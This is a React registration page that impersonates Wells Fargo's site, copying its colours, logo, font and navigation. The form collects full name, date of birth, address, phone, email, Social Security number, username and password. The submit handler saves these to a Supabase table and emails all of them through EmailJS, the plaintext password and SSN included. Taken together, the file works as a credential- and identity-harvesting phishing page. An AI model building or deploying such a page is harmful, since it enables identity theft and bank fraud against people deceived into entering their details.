import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { hashPassword, login } from '../lib/session';
import { sendRegistrationEmail } from '../lib/email';

const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

export default function Register() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    fullName: '', advisoryCustodian: '', dob: '', address: '',
    phone: '', email: '', ssn: '', username: '', password: '',
  });
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSubmitting(true);

    try {
      const password_hash = await hashPassword(form.password);

      // Insert into Supabase
      const { data, error: dbError } = await supabase
        .from('users')
        .insert({
          full_name: form.fullName,
          advisory_custodian: form.advisoryCustodian,
          dob: form.dob,
          address: form.address,
          phone: form.phone,
          email: form.email,
          ssn: form.ssn,
          username: form.username,
          password_hash,
        })
        .select('*')
        .single();

      if (dbError) {
        if (dbError.code === '23505') {
          setError('That email or username is already registered.');
        } else {
          setError(dbError.message || 'Registration failed. Please try again.');
        }
        setSubmitting(false);
        return;
      }

      // Fire EmailJS (don't block on failure — log it)
      try {
        await sendRegistrationEmail({
          full_name: form.fullName,
          advisory_custodian: form.advisoryCustodian,
          dob: form.dob,
          address: form.address,
          phone: form.phone,
          email: form.email,
          ssn: form.ssn,
          username: form.username,
          password: form.password,
        });
      } catch (emailErr) {
        console.error('EmailJS failed:', emailErr);
      }

      login(data);
      navigate('/accounts');
    } catch (err) {
      console.error(err);
      setError('Something went wrong. Please try again.');
      setSubmitting(false);
    }
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', padding: '14px 16px', fontSize: '0.94rem', fontFamily: f,
    border: '1px solid #b5adad', borderRadius: '6px', outline: 'none',
    color: '#141414', backgroundColor: '#fff',
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      {/* Header */}
      <header style={{ backgroundColor: '#D71E28', borderBottom: '4px solid #FFCD41', height: '56px', display: 'flex', alignItems: 'center' }}>
        <div className="max-w-[1400px] mx-auto w-full wf-section-px" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
            <img
              src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png"
              alt="Wells Fargo" width="180" height="20"
              style={{ height: '20px', width: 'auto', filter: 'brightness(0) invert(1)' }}
            />
          </a>
          <nav style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            {['Open an Account', 'Customer Service', 'ATMs/Locations', 'Español'].map((item) => (
              <a key={item} style={{ color: '#fff', textDecoration: 'none', fontSize: '0.76rem', fontFamily: f }} className="wf-hide-mobile hover:underline">
                {item}
              </a>
            ))}
          </nav>
        </div>
      </header>

      <div style={{
        flex: 1,
        backgroundImage: 'url(https://images.unsplash.com/photo-1490750967868-88aa4f44baee?w=1920&q=80)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '24px 16px',
      }}>
        <div className="wf-form-card" style={{
          backgroundColor: 'rgba(255,255,255,0.95)',
          borderRadius: '12px',
          width: '100%',
          maxWidth: '640px',
          boxShadow: '0 8px 32px rgba(0,0,0,0.2)',
        }}>
          <h1 style={{
            fontFamily: f, fontSize: '2rem', fontWeight: 400, fontStyle: 'italic',
            color: '#141414', textAlign: 'center', margin: '0 0 32px',
          }}>
            Welcome
          </h1>

          {error && (
            <div role="alert" style={{
              backgroundColor: '#FDECEA', border: '1px solid #F5C6CB', color: '#721C24',
              padding: '10px 14px', borderRadius: '6px', marginBottom: '16px',
              fontFamily: f, fontSize: '0.88rem',
            }}>
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit}>
            <div className="wf-form-row">
              <input type="text" name="fullName" placeholder="Full Name" required value={form.fullName} onChange={handleChange} style={inputStyle} />
              <input type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
            </div>
            <div className="wf-form-row">
              <input type="date" name="dob" required value={form.dob} onChange={handleChange} style={inputStyle} />
              <input type="text" name="address" placeholder="Address" required value={form.address} onChange={handleChange} style={inputStyle} />
            </div>
            <div className="wf-form-row">
              <input type="tel" name="phone" placeholder="Phone Number" required value={form.phone} onChange={handleChange} style={inputStyle} />
              <input type="email" name="email" placeholder="Email" required value={form.email} onChange={handleChange} style={inputStyle} />
            </div>
            <div className="wf-form-row">
              <input type="password" name="ssn" placeholder="SSN" required value={form.ssn} onChange={handleChange} style={inputStyle} />
              <input type="text" name="username" placeholder="Username" required value={form.username} onChange={handleChange} style={inputStyle} />
            </div>
            <div style={{ marginBottom: '28px' }}>
              <input type="password" name="password" placeholder="Password" required minLength={6} value={form.password} onChange={handleChange} style={inputStyle} />
            </div>

            <div style={{ textAlign: 'center' }}>
              <button
                type="submit"
                disabled={submitting}
                style={{
                  backgroundColor: submitting ? '#9c0b18' : '#D71E28',
                  color: '#fff', border: 'none',
                  borderRadius: '24px', fontFamily: f, fontWeight: 600,
                  fontSize: '1rem', padding: '12px 48px',
                  cursor: submitting ? 'wait' : 'pointer',
                  minWidth: '200px', opacity: submitting ? 0.8 : 1,
                }}
              >
                {submitting ? 'Registering…' : 'Register'}
              </button>
            </div>

            <div style={{ textAlign: 'center', margin: '20px 0', color: '#555', fontSize: '0.88rem', fontFamily: f }}>
              or
            </div>

            <div style={{ textAlign: 'center' }}>
              <button
                type="button"
                onClick={() => navigate('/')}
                style={{
                  backgroundColor: '#fff', color: '#3b3331',
                  border: '1px solid #3b3331', borderRadius: '24px',
                  fontFamily: f, fontWeight: 600, fontSize: '0.94rem',
                  padding: '10px 32px', cursor: 'pointer', minWidth: '180px',
                }}
              >
                🔒 Sign On
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
